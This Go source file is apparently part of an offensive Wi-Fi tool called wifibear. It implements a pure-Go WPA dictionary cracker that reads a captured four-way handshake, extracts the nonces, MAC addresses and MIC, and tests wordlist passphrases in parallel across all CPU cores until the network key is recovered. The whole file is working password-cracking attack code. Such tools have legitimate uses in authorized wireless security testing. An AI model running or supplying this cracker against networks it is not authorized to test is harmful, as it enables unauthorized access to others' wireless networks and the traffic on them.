package attack

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"runtime"
	"sync"
	"sync/atomic"

	"github.com/wifibear/wifibear/internal/handshake"
	"github.com/wifibear/wifibear/pkg/wifi"
)

// NativeCracker performs WPA dictionary attacks using pure Go.
// No aircrack-ng required — uses the crypto primitives in pkg/wifi.
type NativeCracker struct {
	essid   string
	capFile string
	bssid   string
}

func NewNativeCracker(essid, capFile, bssid string) *NativeCracker {
	return &NativeCracker{
		essid:   essid,
		capFile: capFile,
		bssid:   bssid,
	}
}

// CrackWithWordlist tries every word in the wordlist against the captured handshake.
// Uses all CPU cores for parallel PBKDF2 computation.
func (nc *NativeCracker) CrackWithWordlist(ctx context.Context, wordlistPath string) (string, error) {
	// Load handshake from cap file
	state, err := handshake.ScanCapFile(nc.capFile, nc.bssid)
	if err != nil {
		return "", fmt.Errorf("read capture: %w", err)
	}

	complete := state.CompleteHandshakes()
	if len(complete) == 0 {
		return "", fmt.Errorf("no complete handshake found in %s", nc.capFile)
	}

	hs := complete[0]

	// Extract handshake parameters
	aNonce := hs.ANonce()
	sNonce := hs.SNonce()

	var aa, spa [6]byte
	copy(aa[:], hs.BSSID[:])
	copy(spa[:], hs.ClientMAC[:])

	// Get the MIC and EAPOL frame from M2
	if hs.Messages[1] == nil || hs.RawFrames[1] == nil {
		return "", fmt.Errorf("incomplete handshake: missing M2")
	}

	expectedMIC := hs.Messages[1].MIC
	eapolFrame := make([]byte, len(hs.RawFrames[1]))
	copy(eapolFrame, hs.RawFrames[1])

	// Zero out the MIC field in the EAPOL frame for verification
	// MIC is at offset 81-97 in the key frame, which starts at offset 4 in EAPOL
	eapolForMIC := make([]byte, len(eapolFrame))
	copy(eapolForMIC, eapolFrame)
	if len(eapolForMIC) >= 81+16 {
		for i := 81; i < 97 && i < len(eapolForMIC); i++ {
			eapolForMIC[i] = 0
		}
	}

	// Open wordlist
	f, err := os.Open(wordlistPath)
	if err != nil {
		return "", fmt.Errorf("open wordlist: %w", err)
	}
	defer f.Close()

	// Parallel cracking using all CPU cores
	workers := runtime.NumCPU()
	wordCh := make(chan string, workers*4)
	var found atomic.Value
	var wg sync.WaitGroup

	// Start worker goroutines
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for word := range wordCh {
				// Check if another worker already found it
				if found.Load() != nil {
					return
				}

				if wifi.VerifyPassphrase(word, nc.essid, aa, spa, aNonce, sNonce, eapolForMIC, expectedMIC[:]) {
					found.Store(word)
					return
				}
			}
		}()
	}

	// Feed words from the wordlist
	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024) // 1MB buffer for long lines

	for scanner.Scan() {
		select {
		case <-ctx.Done():
			close(wordCh)
			wg.Wait()
			return "", ctx.Err()
		default:
		}

		// Check if found
		if found.Load() != nil {
			break
		}

		word := scanner.Text()
		// WPA passphrase: 8-63 characters
		if len(word) < 8 || len(word) > 63 {
			continue
		}

		wordCh <- word
	}

	close(wordCh)
	wg.Wait()

	if result := found.Load(); result != nil {
		return result.(string), nil
	}

	return "", fmt.Errorf("key not found (wordlist exhausted)")
}
